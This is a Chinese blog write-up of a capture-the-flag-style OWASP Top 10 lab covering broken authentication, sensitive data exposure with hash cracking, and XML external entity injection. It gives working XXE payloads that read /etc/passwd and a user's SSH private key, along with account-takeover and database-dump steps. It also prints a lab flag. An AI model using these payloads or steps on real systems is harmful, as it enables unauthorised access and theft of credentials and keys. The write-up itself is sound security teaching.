<h2 id="严重程度TOP2-损坏的身份验证"><a href="#严重程度TOP2-损坏的身份验证" class="headerlink" title="[严重程度TOP2] 损坏的身份验证"></a>[严重程度TOP2] 损坏的身份验证</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221203185812892.png"
                      alt="image-20221203185812892"
                ></p>
<p>身份验证和会话(session)管理构成了现代 Web 应用程序的核心组件。身份验证允许用户通过验证其身份来访问 Web 应用程序，最常见的身份验证形式是使用用户名和密码机制。 用户需要输入密码凭据，然后服务器将验证它们是否正确，如果用户所提供的凭据是正确的，那么服务器将向用户的浏览器提供一个会话(session) cookie。之所以需要会话(session) cookie，是因为 Web 服务器将使用无状态的 HTTP(S)协议和客户端进行通信，通过附加会话 cookie 意味着服务器将知道是谁在发送什么数据，然后服务器就可以跟踪用户的操作。</p>
<p>如果攻击者能够发现身份验证机制中的缺陷，他们就可以成功访问其他用户所对应的帐户，这将允许攻击者能够访问某些敏感数据（取决于应用程序的目的）。身份验证机制中的一些常见缺陷包括：</p>
<ul>
<li><p>暴力破解攻击：如果 Web 应用程序使用用户名和密码作为身份验证机制，攻击者可能会发起暴力破解攻击，该攻击将允许攻击者使用多次身份验证尝试来猜测用户名和密码，一旦破解成功攻击者就能非法通过身份验证机制。</p>
</li>
<li><p>使用弱凭证：Web 应用程序应设置强密码策略。 如果应用程序允许用户设置诸如“password1”或普通密码之类的弱验证凭据，那么攻击者就能够轻松猜解出这些凭据并实现对用户帐户的访问。</p>
</li>
<li><p>弱会话 Cookie：会话(Session) Cookie 是服务器跟踪用户操作的方式。 如果会话 cookie 包含的是一些可预测的值，那么攻击者就可以伪造会话 cookie 并实现对用户帐户的访问。</p>
</li>
</ul>
<p>根据确切的身份验证机制缺陷，可以有多种针对损坏的身份验证机制的缓解措施：</p>
<ul>
<li><p>为防御密码猜测类型的攻击，请确保web应用程序执行强密码策略。</p>
</li>
<li><p>为防御暴力破解攻击，请确保web应用程序在一定次数的失败的验证尝试后 强制执行自动锁定操作，这将防止攻击者发起更多的暴力破解攻击尝试。</p>
</li>
<li><p>实施多因素身份验证——如果用户有多种身份验证方法，例如，使用用户名和密码机制并要求用户在其移动设备上接收短信代码等，那么攻击者将很难同时获得两种凭据以访问目标用户的帐户。</p>
</li>
</ul>
<h2 id="严重程度TOP2-损坏的身份验证-练习"><a href="#严重程度TOP2-损坏的身份验证-练习" class="headerlink" title="[严重程度TOP2] 损坏的身份验证-练习"></a>[严重程度TOP2] 损坏的身份验证-练习</h2><p>本小节将通过一个示例以研究身份验证机制中的逻辑缺陷。</p>
<p>当开发人员忘记清理用户在web应用程序代码中提供的输入（用户名和密码）时，可能会使目标web应用程序容易受到 SQL 注入等攻击。 但是，在此处我们将重点关注一个逻辑缺陷，即：关于现有用户的重新注册问题。</p>
<p>例子：假设有一个名为 admin 的现有用户，现在我们想要访问admin帐户，我们可以尝试对用户名稍作修改并重新注册用户名，进入用户名注册页面：我们在用户名字段中输入“ admin”（注意此用户名开头含有空格），然后接着输入其他必需信息（如电子邮件ID或密码等）并提交该数据，该操作会注册一个新用户，但该用户将拥有与普通管理员相同的权限。通过登录新用户就能够看到admin用户权限下的相关内容。</p>
<p>要查看实际效果，请访问 <a class="link"   href="http://machine_ip:8888/" >http://MACHINE_IP:8888 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 并尝试注册一个名为 darren的用户，你会看到一个提示，告诉你该用户已经存在，我们继续尝试注册名为“ darren”的用户（注意此用户名开头含有空格），注册完成之后进行登录操作，我们就能看到 darren 帐户中的内容。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221203195339601.png"
                      alt="image-20221203195339601"
                ></p>
<p>启动目标机，访问目标站点： <a class="link"   href="http://10.10.116.78:8888/" >http://10.10.116.78:8888/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>注册名为“ darren”的用户（注意此用户名开头含有空格），登录新用户并查看flag内容：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221203200121330.png"
                      alt="image-20221203200121330"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221203200241739.png"
                      alt="image-20221203200241739"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221203200307678.png"
                      alt="image-20221203200307678"
                ></p>
<p>注册名为“ arthur”的用户（注意此用户名开头含有空格），登录新用户并查看flag内容：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221203200404832.png"
                      alt="image-20221203200404832"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221203200437726.png"
                      alt="image-20221203200437726"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221203200502403.png"
                      alt="image-20221203200502403"
                ></p>
<h2 id="严重程度TOP3-敏感信息泄露-介绍"><a href="#严重程度TOP3-敏感信息泄露-介绍" class="headerlink" title="[严重程度TOP3] 敏感信息泄露-介绍"></a>[严重程度TOP3] 敏感信息泄露-介绍</h2><p>当 web 应用程序意外泄露敏感数据时，我们将其称为“敏感数据泄露”，这些数据通常是与用户直接相关的数据（例如姓名、出生日期、财务信息等），但也可能是一些技术信息，例如用户名和密码。在更复杂的层面上，这通常涉及诸如“中间人攻击”之类的技术，攻击者将通过他们控制的设备强制用户连接，然后利用对任何传输数据的弱加密来获取对拦截信息的访问权限（如果数据首先经过了加密……）。当然，有些示例要简单得多，我们可以在 目标Web 应用程序中找到该类漏洞，而且无需任何高级网络知识即可利用这些漏洞。事实上，在某些情况下，敏感数据可以直接在web服务器相关的的网站页面上找到……</p>
<h2 id="严重程度TOP3-敏感信息泄露-材料1"><a href="#严重程度TOP3-敏感信息泄露-材料1" class="headerlink" title="[严重程度TOP3] 敏感信息泄露-材料1"></a>[严重程度TOP3] 敏感信息泄露-材料1</h2><p>以一种可以同时从多个位置轻松访问的格式来存储大量数据的最常见方法是通过数据库。 这显然非常适合 Web 应用程序，因为可能会有许多用户在任意时间内与目标网站发生交互。 数据库引擎通常遵循结构化查询语言 (SQL-<strong>S</strong>tructured <strong>Q</strong>uery <strong>L</strong>anguage) 语法； 然而，一些替代方案（例如 NoSQL）也越来越受欢迎。</p>
<p>在生产环境中，通常会看到在专用服务器上设置数据库，如运行 MySQL 或 MariaDB 等数据库服务；但是，数据库也可以被存储为文件形式，这些文件形式的数据库被称为“平面文件(flat-file)”数据库，因为它们是作为单个文件而存储在计算机上的。 使用“平面文件(flat-file)”比设置完整的数据库服务器要容易得多，因此可能会在较小的 Web 应用程序中看到。 </p>
<p>如前所述，平面文件数据库是作为文件存储在计算机磁盘上的，这对于 Web 应用程序来说不会造成其他问题，但是如果将平面文件数据库存储在网站的根目录下（即连接到网站用户所能够访问的文件之一），将会发生什么情况呢？ 这将导致我们可以直接下载它到我们的本地机器上，并且可以完全访问对应的平面文件数据库中的所有内容，进而造成了敏感数据泄露！</p>
<p>让我们简要介绍一些用于查询平面文件数据库的语法。</p>
<p>最常见（也是最简单）的平面文件数据库格式是 sqlite 数据库，可以在大多数编程语言环境下进行交互，并且有一个专门的客户端可以在命令行上查询数据信息，这个客户端叫做“sqlite3”，在 Kali 中将默认安装。</p>
<p>假设我们已经成功地下载了一个平面文件数据库：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221203223336491.png"
                      alt="image-20221203223336491"
                ></p>
<p>我们可以看到在当前文件夹中有一个SQLite数据库文件。</p>
<p>要访问它，我们可以使用：<code>sqlite3 &lt;database-name&gt;</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221203223516357.png"
                      alt="image-20221203223516357"
                ></p>
<p>然后我们可以接着查看数据库中的表，通过使用命令<code>.tables</code>：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221203223657467.png"
                      alt="image-20221203223657467"
                ></p>
<p>此时我们可以转储该表中的所有数据，但在转储数据之前，我们还需要先查看表的相关信息，否则我们不一定知道表中每一列的具体含义。 </p>
<p>首先使用<code>PRAGMA table_info(customers);</code>查看表信息，然后使用<code>SELECT * FROM customers;</code>转储该表中的信息：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221203224039023.png"
                      alt="image-20221203224039023"
                ></p>
<p>我们从表信息中可以看出，此表一共有四列：<code>custID</code>、<code>custName</code>、<code>creditCard</code>和<code>password</code>。 你可能会注意到这与查询该表的结果相符。</p>
<p>取第一行：</p>
<blockquote>
<p>0|Joy Paulson|4916 9012 2231 7905|5f4dcc3b5aa765d61d8327deb882cf99</p>
</blockquote>
<p>我们能够得知数据信息 custID (0)、custName (Joy Paulson)、creditCard (4916 9012 2231 7905) 和密码哈希值 (5f4dcc3b5aa765d61d8327deb882cf99)。</p>
<p>在下一小节中，我们将着眼于破解这个哈希值。</p>
<h2 id="严重程度TOP3-敏感信息泄露-材料2"><a href="#严重程度TOP3-敏感信息泄露-材料2" class="headerlink" title="[严重程度TOP3] 敏感信息泄露-材料2"></a>[严重程度TOP3] 敏感信息泄露-材料2</h2><p>在上一个小节中，我们了解了如何查询 SQLite 数据库中的敏感数据，并且找到了一些密码哈希值(每个用户都有一个)。 在本小节中，我们将简要介绍如何破解这些密码哈希值。</p>
<p>在哈希破解方面，Kali 预装了各种工具——如果你知道如何使用这些工具，请随意使用即可。</p>
<p>在本小节中我们将使用在线工具进行hash破解工作：<a class="link"   href="https://crackstation.net/" >Crackstation <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。Crackstation网站非常擅长破解弱密码的哈希值，而对于更复杂的哈希，我们则需要使用其他工具来进行破解； 例子中的所有可破解的密码哈希值都是弱密码的 MD5 哈希值，所以我们直接使用Crackstation在线破解即可。</p>
<p>当我们导航到Crackstation网站时，我们会看到以下界面：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221203225245851.png"
                      alt="image-20221203225245851"
                ></p>
<p>粘贴我们在上一小节中找到的 Joy Paulson 的密码哈希值(<code>5f4dcc3b5aa765d61d8327deb882cf99</code>) ，勾选验证码，然后点击“破解哈希”按钮即可：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221203225511295.png"
                      alt="image-20221203225511295"
                ></p>
<p>我们看到哈希值被成功破解，目标用户的密码是“password”！</p>
<p>注意：Crackstation 网站在破解hash时，将使用很大的字典，如果哈希值所对应的密码确实不在字典中，那么 Crackstation 将无法破解该哈希值。</p>
<h2 id="严重程度TOP3-敏感信息泄露-练习"><a href="#严重程度TOP3-敏感信息泄露-练习" class="headerlink" title="[严重程度TOP3] 敏感信息泄露-练习"></a>[严重程度TOP3] 敏感信息泄露-练习</h2><p>启动目标机器，回答知识点相关问题！</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221203230018507.png"
                      alt="image-20221203230018507"
                ></p>
<p>启动目标机器，访问目标站点，查看login网页的页面源代码，可以看到作者留下的一些评论，告诉我们 &#x2F;assets 中有一个数据库文件：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221204191557968.png"
                      alt="image-20221204191557968"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221204191855964.png"
                      alt="image-20221204191855964"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221204191939098.png"
                      alt="image-20221204191939098"
                ></p>
<p>通过浏览器的url地址栏 导航到 &#x2F;assets ，找到数据库文件（点击文件即可下载到攻击机上）：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221204192050796.png"
                      alt="image-20221204192050796"
                ></p>
<p>通过浏览器下载数据库文件，然后在攻击机终端使用命令<code>ls</code>和<code>file webapp.db</code>（验证所下载的文件是否为数据库文件）：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221204192411223.png"
                      alt="image-20221204192411223"
                ></p>
<p>使用命令<code>sqlitebrowser webapp.db</code>通过使用可视化客户端打开数据库文件，查看用户表中的敏感信息：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221204192733787.png"
                      alt="image-20221204192733787"
                ></p>
<p>使用以下网站，进行在线hash破解操作：</p>
<blockquote>
<p><a class="link"   href="https://crackstation.net/" >https://crackstation.net/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://hashes.com/en/decrypt/hash" >https://hashes.com/en/decrypt/hash <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221204192841587.png"
                      alt="image-20221204192841587"
                ></p>
<p>使用刚才得到的明文密码信息以admin用户身份登录目标站点，查看flag内容：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221204193007000.png"
                      alt="image-20221204193007000"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221204193046169.png"
                      alt="image-20221204193046169"
                ></p>
<blockquote>
<p>THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl} 。</p>
</blockquote>
<h2 id="严重程度TOP4-XML-外部实体注入（XXE漏洞）"><a href="#严重程度TOP4-XML-外部实体注入（XXE漏洞）" class="headerlink" title="[严重程度TOP4] XML 外部实体注入（XXE漏洞）"></a>[严重程度TOP4] XML 外部实体注入（XXE漏洞）</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221204193850941.png"
                      alt="image-20221204193850941"
                ></p>
<p>XML 外部实体 (XXE) 注入是一种滥用 XML 解析器&#x2F;数据 功能的漏洞。它通常允许攻击者与应用程序本身可以访问的任何后端或外部系统进行交互，并且可以允许攻击者读取该系统上的文件，XXE还可以导致拒绝服务 (DoS-Denial of Service) 攻击，或者可以使用 XXE 执行服务器端请求伪造 (SSRF)，诱导 Web 应用程序向其他应用程序发出请求。 XXE甚至能够进行端口扫描以及导致远程代码执行。</p>
<p>XXE 攻击有两种类型：带内(in-band)和带外 (out-of-band)，带外的XXE可简写为OOB-XXE。</p>
<p>1.在带内 XXE 攻击中，攻击者可以立即收到web应用程序对 XXE payload的响应。</p>
<p>2.在带外 XXE 攻击（也可称为盲注类型的 XXE）中，Web 应用程序不会立即响应XXE payload，攻击者必须将XXE payload对应的响应输出反映到其他文件中或攻击者所控制的服务器上。</p>
<h2 id="严重程度TOP4-XXE漏洞-XML可扩展标记性语言"><a href="#严重程度TOP4-XXE漏洞-XML可扩展标记性语言" class="headerlink" title="[严重程度TOP4] XXE漏洞-XML可扩展标记性语言"></a>[严重程度TOP4] XXE漏洞-XML可扩展标记性语言</h2><p>在我们继续学习如何利用XXE 漏洞之前，我们必须正确理解 XML 的概念。</p>
<p><strong>什么是XML？</strong></p>
<p>XML（eXtensible Markup Language-可扩展标记语言）是一种标记语言，它定义了一组规则，用于以人工可读和机器可读的格式对文档进行编码处理，XML是一种用于存储和传输数据的标记语言。</p>
<p><strong>为什么要使用XML？</strong></p>
<p>1.XML 是独立于平台和编程语言的，因此它可以在任何系统上使用，并能支持IT技术变更的情况。</p>
<p>2.使用 XML 存储和传输的数据可以在任何时间点更改，且不会影响数据表示。</p>
<p>3.XML 允许使用 DTD 和Schema(模式)进行内容验证，此验证可确保 XML 文档没有任何语法错误。</p>
<p>4.由于XML独立于平台的特性，它简化了各种系统之间的数据共享，因为XML数据在不同系统之间传输时 不需要进行任何转换处理。</p>
<p><strong>语法</strong></p>
<p>每个 XML 文档大多以 XML Prolog 开头：</p>
<p><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</code></p>
<p>上面一行被称为 XML 序言(prolog )，它将指定 XML 版本和 XML 文档中所使用的编码类型，该行不是强制使用的，但将这一行放在所有 XML 文档的开头被认为是一种“良好做法”。</p>
<p>每个 XML 文档都必须包含一个“ROOT”元素，例如：</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mail</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">to</span>&gt;</span>falcon<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">from</span>&gt;</span>feast<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">subject</span>&gt;</span>About XXE<span class="tag">&lt;/<span class="name">subject</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">text</span>&gt;</span>Teach about XXE<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mail</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>在上面的示例中，<code>&lt;mail&gt;</code> 是该文档的 ROOT 元素，<code>&lt;to&gt;</code>、<code>&lt;from&gt;</code>、<code>&lt;subject&gt;</code>、<code>&lt;text&gt;</code> 是子元素。 如果一个 XML 文档没有任何根元素，那么它将被认为是错误的或无效的 XML 文档。</p>
<p>另一件要记住的事情是 XML 是一种区分大小写的语言：如果标签以 <code>&lt;to&gt;</code> 开头，那么它必须以 <code>&lt;/to&gt;</code> 结尾，而不能以 <code>&lt;/To&gt;</code> （大写T ）结尾。</p>
<p>与 HTML 一样，我们也可以在 XML 中使用属性(attributes )，XML中关于属性的语法也与 HTML 非常相似，例如：</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">text</span> <span class="attr">category</span> = <span class="string">&quot;message&quot;</span>&gt;</span>You need to learn about XXE<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>tips：category英文翻译为–类别</p>
<p>在上面的示例中，category 是属性名称，message 是属性值。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221204223418751.png"
                      alt="image-20221204223418751"
                ></p>
<h2 id="严重程度TOP4-XXE漏洞-DTD概念"><a href="#严重程度TOP4-XXE漏洞-DTD概念" class="headerlink" title="[严重程度TOP4] XXE漏洞-DTD概念"></a>[严重程度TOP4] XXE漏洞-DTD概念</h2><p>在继续学习 XXE 之前，我们必须了解什么是XML中的 DTD 。</p>
<p>DTD 代表文档类型定义(Document Type Definition)，DTD将定义一个XML 文档的结构以及合法元素和属性(attributes )。</p>
<p>让我们试着借助一个例子来理解这一点，假设我们有一个名为 <em><strong>note.dtd</strong></em> 的文件，其中包含以下内容：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE note [ &lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!ELEMENT to (#PCDATA)&gt; &lt;!ELEMENT from (#PCDATA)&gt; &lt;!ELEMENT heading (#PCDATA)&gt; &lt;!ELEMENT body (#PCDATA)&gt; ]&gt;</span><br></pre></td></tr></table></figure></div>

<p>现在我们可以使用这个 DTD 来验证一些 XML 文档的信息，并确保 XML 文件符合该 DTD 所描述的规则。<br>例如：下面给出了一个使用 <em><strong>note.dtd</strong></em> 的 XML 文档</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;note.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span>falcon<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">from</span>&gt;</span>feast<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">heading</span>&gt;</span>hacking<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span>XXE attack<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>现在让我们来了解 DTD 是如何验证 XML文档信息的，以下是<code>note.dtd</code>文件中的DTD术语的含义（下面的DTD术语和上面的XML文档示例内容存在对应关系）：</p>
<ul>
<li><code>!DOCTYPE note</code> - 定义名为<code>note</code> 的XML文档根元素（根元素为note）</li>
<li><code>!ELEMENT note</code> - 定义根元素<code>note</code>必须包含子元素：“<code>to</code>, <code>from</code>, <code>heading</code>, <code>body</code>”</li>
<li><code>!ELEMENT to</code> - 将<code>to</code>元素定义为“#PCDATA”类型</li>
<li><code>!ELEMENT from</code> - 将 <code>from</code> 元素定义为“#PCDATA”类型</li>
<li><code>!ELEMENT heading</code> - 将<code>heading</code>元素定义为“#PCDATA”类型</li>
<li><code>!ELEMENT body</code> - 将<code>body</code>元素定义为“#PCDATA”类型</li>
</ul>
<p>注意：#PCDATA 表示可解析的字符数据。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221204235609263.png"
                      alt="image-20221204235609263"
                ></p>
<blockquote>
<p>在DTD文件中定义一个新实体：!ENTITY</p>
</blockquote>
<h2 id="严重程度TOP4-XXE漏洞-XXE-Payload"><a href="#严重程度TOP4-XXE漏洞-XXE-Payload" class="headerlink" title="[严重程度TOP4] XXE漏洞-XXE Payload"></a>[严重程度TOP4] XXE漏洞-XXE Payload</h2><p>现在我们将查看一些 XXE payload并了解它们是如何工作的。</p>
<p>1.我们将看到的第一个有效载荷非常简单。 如果你掌握前面的知识点，那么你将很容易理解此有效载荷。</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">replace</span> [<span class="meta">&lt;!ENTITY <span class="keyword">name</span> <span class="string">&quot;feast&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">userInfo</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">firstName</span>&gt;</span>falcon<span class="tag">&lt;/<span class="name">firstName</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">lastName</span>&gt;</span><span class="symbol">&amp;name;</span><span class="tag">&lt;/<span class="name">lastName</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">userInfo</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>正如我们在上例中所看到的，我们首先定义一个名为 <code>name</code> 的 <code>ENTITY</code> (实体)并为其分配一个值<code>feast</code>，并随后在示例代码中使用该<code>ENTITY</code>。</p>
<p>2.我们也可以使用以下XXE payload，通过定义一个<code>ENTITY</code>并让它使用<code>SYSTEM</code>关键字来从目标系统中读取一些文件信息。</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [<span class="meta">&lt;!ENTITY <span class="keyword">read</span> <span class="keyword">SYSTEM</span> <span class="string">&#x27;file:///etc/passwd&#x27;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;read;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>同样，在上例中我们定义了一个名为 <code>read</code> 的 <code>ENTITY</code>(实体)，但不同之处在于 我们将其值设置为“<code>SYSTEM</code>”并指定了文件路径。</p>
<p>如果我们使用这个 payload，那么在易受 XXE 攻击的目标网站页面上（通常）就会显示文件<code>/etc/passwd</code> 的内容。我们也可以使用这种有效载荷来尝试读取其他文件信息，但很多时候你可能会读取失败，这也许是因为你所读取的文件本身并不支持以XXE响应消息的方式被查看。</p>
<h2 id="严重程度TOP4-XXE漏洞利用"><a href="#严重程度TOP4-XXE漏洞利用" class="headerlink" title="[严重程度TOP4] XXE漏洞利用"></a>[严重程度TOP4] XXE漏洞利用</h2><p>现在让我们使用前文所提到的有效载荷进行XXE漏洞利用。</p>
<p>1.让我们看看如果我们尝试使用payload来显示名称(name)，目标网站将如何响应。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221205111742729.png"
                      alt="image-20221205111742729"
                ></p>
<p>tips：上图为BurpSuite使用界面。</p>
<p>在上图的左侧，我们可以看到一个burp请求：这将向目标站点发送 使用 URL 编码的payload(具体的payload内容见上一小节知识点)；在上图的右侧我们可以看到使用该payload之后，在目标站点的页面上能够成功显示名称(name)值<code>falcon feast</code>。</p>
<p>2.现在让我们尝试读取 <code>/etc/passwd</code>文件内容</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221205112504755.png"
                      alt="image-20221205112504755"
                ></p>
<p>能够成功读取(使用的payload同样经过了URL编码，具体的payload内容见上一小节知识点)。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221205112734898.png"
                      alt="image-20221205112734898"
                ></p>
<p>启动目标机器，访问目标站点，进行XXE漏洞利用：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221205190226634.png"
                      alt="image-20221205190226634"
                ></p>
<p>在攻击框中使用XXE payload–用于显示name值（此处显示的是自己在XML中设定的某个name值）：</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">replace</span> [<span class="meta">&lt;!ENTITY <span class="keyword">name</span> <span class="string">&quot;feast&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">userInfo</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">firstName</span>&gt;</span>Hihihi<span class="tag">&lt;/<span class="name">firstName</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">lastName</span>&gt;</span><span class="symbol">&amp;name;</span><span class="tag">&lt;/<span class="name">lastName</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">userInfo</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221205190347909.png"
                      alt="image-20221205190347909"
                ></p>
<p>在攻击框中使用XXE payload–用于查看<code>/etc/passwd</code>文件内容，获取目标站点所对应系统的当前用户名：</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [<span class="meta">&lt;!ENTITY <span class="keyword">read</span> <span class="keyword">SYSTEM</span> <span class="string">&#x27;file:///etc/passwd&#x27;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;read;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221205191515365.png"
                      alt="image-20221205191515365"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221205190725517.png"
                      alt="image-20221205190725517"
                ></p>
<p>在Linux系统中，用户对应的SSH密钥的默认保存路径为***&#x2F;home&#x2F;用户名&#x2F;.ssh&#x2F;id_rsa*** ；此处的用户名为falcon，所以路径为<code>/home/falcon/.ssh/id_rsa</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221205190035962.png"
                      alt="image-20221205190035962"
                ></p>
<p>在攻击框中使用XXE payload–用于查看当前用户falcon的私钥内容：</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [<span class="meta">&lt;!ENTITY <span class="keyword">read</span> <span class="keyword">SYSTEM</span> <span class="string">&#x27;file:///home/falcon/.ssh/id_rsa&#x27;</span>&gt;</span>]&gt;</span>                                                    </span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;read;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221205191357202.png"
